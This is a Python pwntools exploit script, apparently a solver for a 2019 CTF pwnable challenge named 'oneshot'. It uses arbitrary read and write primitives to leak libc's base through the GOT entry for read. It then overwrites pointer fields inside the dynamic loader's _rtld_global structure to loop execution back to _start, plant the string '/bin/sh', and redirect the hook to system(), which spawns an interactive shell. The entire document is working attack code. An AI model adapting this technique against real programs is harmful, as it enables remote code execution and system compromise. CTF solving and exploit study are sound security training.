#!/usr/bin/python

'''
Stealien @ 314ckC47
exp.py 2019 kongju keris pwnable task solver
'''

from pwn import *

e = ELF("./oneshot")
l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
d = ELF("/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")

def read_ptr(pointer):
    p.send(p64(pointer))
    return u64(p.recv(8))

def write_ptr(pointer, value):
    p.send(p64(pointer))
    p.send(p64(value))

p = process(e.path)

raw_input(">>> ")

''' stage 1 '''
leak = read_ptr(e.got['read'])
l.address = leak - l.symbols['read']
d.address = l.address + 0x3f1000

log.info("libc.so.6 = 0x%x", l.address)
log.info("ld-linux-x86-64.so.2 = 0x%x", d.address)

write_ptr(d.symbols['_rtld_global']+3840, e.symbols['_start'])

''' stage 2 '''
read_ptr(e.got['read'])
write_ptr(d.symbols['_rtld_global']+2312, u64("/bin/sh\x00"))

''' stage 3 '''
read_ptr(e.got['read'])
write_ptr(d.symbols['_rtld_global']+3840, l.symbols['system'])

p.interactive()
p.close()
